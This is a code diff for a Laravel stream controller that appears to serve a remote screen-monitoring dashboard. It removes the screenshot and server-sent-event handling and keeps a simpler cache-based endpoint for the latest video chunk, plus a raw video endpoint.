@@ -54,180 +54,42 @@ class StreamController extends Controller
         $streamRequest = cache()->get("stream_request_{$clientId}");
 
         return response()->json([
-            'should_stream' => $streamRequest ? true : false,
+            'should_stream' => !!$streamRequest,
             'quality' => $streamRequest['quality'] ?? 'medium',
             'timestamp' => $streamRequest['timestamp'] ?? null
         ]);
     }
 
-    public function uploadVideoChunk(Request $request, $clientId)
-    {
-        try {
-            $videoChunk = $request->input('video_chunk');
-            $sequence = $request->input('sequence', 0);
-            $quality = $request->input('quality', 'medium');
-            $streamType = $request->input('stream_type', 'video');
-
-            if (!$videoChunk) {
-                return response()->json(['error' => 'No video chunk provided'], 400);
-            }
-
-            // Store video chunk temporarily (for live streaming)
-            $chunkKey = "video_chunk_{$clientId}_{$sequence}";
-            cache()->put($chunkKey, [
-                'video_chunk' => $videoChunk,
-                'sequence' => $sequence,
-                'quality' => $quality,
-                'timestamp' => now(),
-                'stream_type' => $streamType
-            ], 30); // Keep for 30 seconds
-
-            // Store latest video chunk for dashboard
-            cache()->put("latest_video_{$clientId}", [
-                'video_chunk' => $videoChunk,
-                'sequence' => $sequence,
-                'quality' => $quality,
-                'timestamp' => now(),
-                'stream_type' => $streamType
-            ], 60);
-
-            Log::info("Video chunk received from client {$clientId}, sequence: {$sequence}");
-
-            return response()->json(['success' => true]);
-
-        } catch (\Exception $e) {
-            Log::error("Error uploading video chunk: " . $e->getMessage());
-            return response()->json(['error' => 'Failed to upload video chunk'], 500);
-        }
-    }
-
-    public function uploadScreenshotChunk(Request $request, $clientId)
-    {
-        try {
-            $screenshot = $request->input('screenshot');
-            $sequence = $request->input('sequence', 0);
-            $quality = $request->input('quality', 'medium');
-            $streamType = $request->input('stream_type', 'screenshot');
-
-            if (!$screenshot) {
-                return response()->json(['error' => 'No screenshot provided'], 400);
-            }
-
-            // Store screenshot chunk
-            $chunkKey = "screenshot_chunk_{$clientId}_{$sequence}";
-            cache()->put($chunkKey, [
-                'screenshot' => $screenshot,
-                'sequence' => $sequence,
-                'quality' => $quality,
-                'timestamp' => now(),
-                'stream_type' => $streamType
-            ], 30);
-
-            // Store latest screenshot for dashboard
-            cache()->put("latest_screenshot_{$clientId}", [
-                'screenshot' => $screenshot,
-                'sequence' => $sequence,
-                'quality' => $quality,
-                'timestamp' => now(),
-                'stream_type' => $streamType
-            ], 60);
-
-            Log::info("Screenshot chunk received from client {$clientId}, sequence: {$sequence}");
-
-            return response()->json(['success' => true]);
-
-        } catch (\Exception $e) {
-            Log::error("Error uploading screenshot chunk: " . $e->getMessage());
-            return response()->json(['error' => 'Failed to upload screenshot chunk'], 500);
-        }
-    }
-
     public function uploadStreamChunk(Request $request, $clientId)
     {
         try {
-            // Enhanced multi-key extraction + debug
-            if ($request->header('X-Chunk-Debug') === '1') {
-                Log::debug('uploadStreamChunk raw inbound', [
-                    'client_id' => $clientId,
-                    'content_type' => $request->header('Content-Type'),
-                    'keys' => array_keys($request->all()),
-                    'raw_len' => strlen($request->getContent()),
-                ]);
-            }
-
             $chunk = $request->input('chunk')
                 ?? $request->input('chunk_data')
                 ?? $request->input('video_chunk')
-                ?? $request->input('screenshot')
                 ?? $request->input('data');
 
-            $sequence   = $request->input('sequence', 0);
-            $streamType = $request->input('stream_type', 'video');
-            $quality    = $request->input('quality', 'medium');
+            $sequence = $request->input('sequence', 0);
+            $quality = $request->input('quality', 'medium');
 
             if (empty($chunk)) {
                 Log::warning('uploadStreamChunk missing chunk data', [
                     'client_id' => $clientId,
                     'received_keys' => array_keys($request->all())
                 ]);
-                return response()->json(['error' => 'No chunk data'], 400);
+                return response()->json(['error' => 'No chunk data provided'], 400);
             }
 
-            // Basic base64 validation
-            if (base64_decode($chunk, true) === false) {
-                Log::warning('uploadStreamChunk invalid base64', [
-                    'client_id' => $clientId,
-                    'sequence' => $sequence
-                ]);
-                return response()->json(['error' => 'Invalid chunk format'], 400);
-            }
-
-            // Ensure client exists (create if not)
-            $client = Client::firstOrCreate(
-                ['client_id' => $clientId],
-                [
-                    'hostname' => $request->input('hostname', 'unknown'),
-                    'username' => $request->input('username', 'system'),
-                    'status' => 'active',
-                    'timezone' => 'Asia/Jakarta',
-                    'ip_address' => $request->ip(),
-                    'os_info' => [
-                        'name' => $request->input('os', 'unknown'),
-                        'platform' => $request->input('platform', 'unknown')
-                    ],
-                    'last_seen' => now(),
-                    'first_seen' => now()
-                ]
-            );
-
-            $chunkPath = "stream_chunks/{$clientId}/{$sequence}.chunk";
-            Storage::put($chunkPath, base64_decode($chunk));
-
-            cache()->put("latest_chunk_{$clientId}", [
+            // Store the latest video frame in cache for the dashboard to fetch.
+            // This is the core of the live streaming view.
+            cache()->put("latest_video_chunk_{$clientId}", [
                 'data' => $chunk,
                 'sequence' => $sequence,
                 'timestamp' => now(),
                 'quality' => $quality,
-                'stream_type' => $streamType
-            ], 60);
+            ], 10); // Keep for 10 seconds
 
-            if ($streamType === 'video') {
-                cache()->put("latest_video_{$clientId}", [
-                    'video_chunk' => $chunk,
-                    'sequence' => $sequence,
-                    'timestamp' => now(),
-                    'quality' => $quality,
-                    'stream_type' => $streamType
-                ], 60);
-            }
-
-            $this->broadcastChunk($clientId, $chunk, $sequence, $streamType);
-
-            Log::info("Stream chunk stored", [
-                'client_id' => $clientId,
-                'sequence' => $sequence,
-                'type' => $streamType
-            ]);
+            // Optional: Log for debugging purposes
+            // Log::info("Video chunk received", ['client_id' => $clientId, 'sequence' => $sequence]);
 
             return response()->json(['success' => true, 'sequence' => $sequence]);
 
@@ -240,164 +102,33 @@ class StreamController extends Controller
         }
     }
 
-    public function streamEvents($clientId)
-    {
-        return response()->stream(function() use ($clientId) {
-            // Set headers for Server-Sent Events
-            echo "data: " . json_encode(['type' => 'connected', 'client_id' => $clientId]) . "\n\n";
-
-            // Keep connection alive and send stream data
-            $lastSequence = 0;
-            while (true) {
-                // Check for new chunks
-                $chunks = Storage::files("stream_chunks/{$clientId}");
-
-                foreach ($chunks as $chunkFile) {
-                    $sequence = intval(basename($chunkFile, '.chunk'));
-
-                    if ($sequence > $lastSequence) {
-                        $chunkData = Storage::get($chunkFile);
-                        $encodedChunk = base64_encode($chunkData);
-
-                        echo "data: " . json_encode([
-                            'type' => 'stream_data',
-                            'client_id' => $clientId,
-                            'sequence' => $sequence,
-                            'data' => $encodedChunk
-                        ]) . "\n\n";
-
-                        $lastSequence = $sequence;
-
-                        // Clean up old chunks
-                        Storage::delete($chunkFile);
-                    }
-                }
-
-                // Check if streaming should continue
-                if (!cache()->has("stream_request_{$clientId}")) {
-                    echo "data: " . json_encode(['type' => 'stream_ended']) . "\n\n";
-                    break;
-                }
-
-                usleep(50000); // 50ms delay
-
-                // Flush output
-                if (ob_get_level()) {
-                    ob_flush();
-                }
-                flush();
-            }
-        }, 200, [
-            'Content-Type' => 'text/event-stream',
-            'Cache-Control' => 'no-cache',
-            'Connection' => 'keep-alive',
-        ]);
-    }
-
-    protected function broadcastChunk($clientId, $chunk, $sequence, $streamType = 'unknown')
-    {
-        // Store latest chunk for immediate access
-        cache()->put("latest_chunk_{$clientId}", [
-            'data' => $chunk,
-            'sequence' => $sequence,
-            'timestamp' => now(),
-            'stream_type' => $streamType
-        ], 60);
-    }
-
     public function getLatestChunk($clientId)
     {
         try {
-            // Serve from cache first without requiring a Client row
-            $chunk = cache()->get("latest_chunk_{$clientId}");
-            if ($chunk) {
-                return response()->json([
-                    'data' => $chunk['data'],
-                    'sequence' => $chunk['sequence'],
-                    'timestamp' => $chunk['timestamp'],
-                    'type' => $chunk['stream_type'] ?? 'video',
-                    'quality' => $chunk['quality'] ?? 'medium',
-                    'source' => 'cache_primary'
-                ]);
-            }
+            // Directly fetch the latest video chunk from the cache.
+            // This is the ONLY source for the live view now. No fallbacks.
+            $videoChunk = cache()->get("latest_video_chunk_{$clientId}");
 
-            $videoChunk = cache()->get("latest_video_{$clientId}");
             if ($videoChunk) {
                 return response()->json([
-                    'data' => $videoChunk['video_chunk'],
+                    'data' => $videoChunk['data'],
                     'sequence' => $videoChunk['sequence'],
                     'timestamp' => $videoChunk['timestamp'],
-                    'type' => 'video_stream',
+                    'type' => 'video_stream', // Hardcoded to video stream
                     'quality' => $videoChunk['quality'] ?? 'medium',
                     'source' => 'cache_video'
                 ]);
             }
 
-            $screenshotChunk = cache()->get("latest_screenshot_{$clientId}");
-            if ($screenshotChunk) {
-                return response()->json([
-                    'data' => $screenshotChunk['screenshot'],
-                    'sequence' => $screenshotChunk['sequence'],
-                    'timestamp' => $screenshotChunk['timestamp'],
-                    'type' => 'screenshot_stream',
-                    'quality' => $screenshotChunk['quality'] ?? 'medium',
-                    'source' => 'cache_screenshot'
-                ]);
-            }
-
-            // Check for client in database and try to create if not exists
-            $client = Client::where('client_id', $clientId)->first();
-            if (!$client) {
-                // Try to create client automatically for stream requests
-                $client = Client::firstOrCreate(
-                    ['client_id' => $clientId],
-                    [
-                        'hostname' => 'auto-created',
-                        'username' => 'system',
-                        'status' => 'active',
-                        'timezone' => 'Asia/Jakarta',
-                        'ip_address' => request()->ip() ?? '127.0.0.1',
-                        'os_info' => [
-                            'name' => 'unknown',
-                            'platform' => 'unknown'
-                        ],
-                        'last_seen' => now(),
-                        'first_seen' => now()
-                    ]
-                );
-
-                Log::info("Auto-created client for stream request", [
-                    'client_id' => $clientId,
-                    'created_client_id' => $client->id
-                ]);
-            }
-
-            // Try to get latest screenshot as fallback
-            $latestScreenshot = $client->screenshots()
-                ->orderBy('captured_at', 'desc')
-                ->first();
-
-            if ($latestScreenshot && $latestScreenshot->hasValidFilePath()) {
-                $imagePath = storage_path('app/public/' . $latestScreenshot->file_path);
-                if (file_exists($imagePath)) {
-                    return response()->json([
-                        'data' => base64_encode(file_get_contents($imagePath)),
-                        'sequence' => time(),
-                        'timestamp' => $latestScreenshot->captured_at,
-                        'type' => 'screenshot_fallback',
-                        'source' => 'db_screenshot'
-                    ]);
-                }
-            }
-
-            // Return empty state instead of error for better UX
+            // If no data is available, return an empty state.
+            // This prevents the frontend from showing old screenshots.
             return response()->json([
                 'data' => null,
                 'sequence' => 0,
                 'timestamp' => now(),
                 'type' => 'empty',
                 'source' => 'no_data',
-                'message' => 'No stream data available yet'
+                'message' => 'No live stream data available.'
             ]);
 
         } catch (\Exception $e) {
@@ -408,6 +139,44 @@ class StreamController extends Controller
 
             return response()->json([
                 'error' => 'Failed to retrieve stream data',
+                'client_id' => $clientId
+            ], 500);
+        }
+    }
+
+    public function getVideoStream($clientId)
+    {
+        try {
+            // Get the latest video chunk from cache
+            $videoChunk = cache()->get("latest_video_chunk_{$clientId}");
+
+            if ($videoChunk && isset($videoChunk['data'])) {
+                // Return the raw video data with appropriate headers
+                $videoData = base64_decode($videoChunk['data']);
+
+                return response($videoData, 200, [
+                    'Content-Type' => 'video/mp4',
+                    'Cache-Control' => 'no-cache, no-store, must-revalidate',
+                    'Pragma' => 'no-cache',
+                    'Expires' => '0',
+                    'Access-Control-Allow-Origin' => '*',
+                ]);
+            }
+
+            // Return a placeholder or error response
+            return response()->json([
+                'error' => 'No video stream available',
+                'message' => 'Client is not currently streaming'
+            ], 404);
+
+        } catch (\Exception $e) {
+            Log::error("Error getting video stream: " . $e->getMessage(), [
+                'client_id' => $clientId,
+                'trace' => $e->getTraceAsString()
+            ]);
+
+            return response()->json([
+                'error' => 'Failed to retrieve video stream',
                 'client_id' => $clientId
             ], 500);
         }
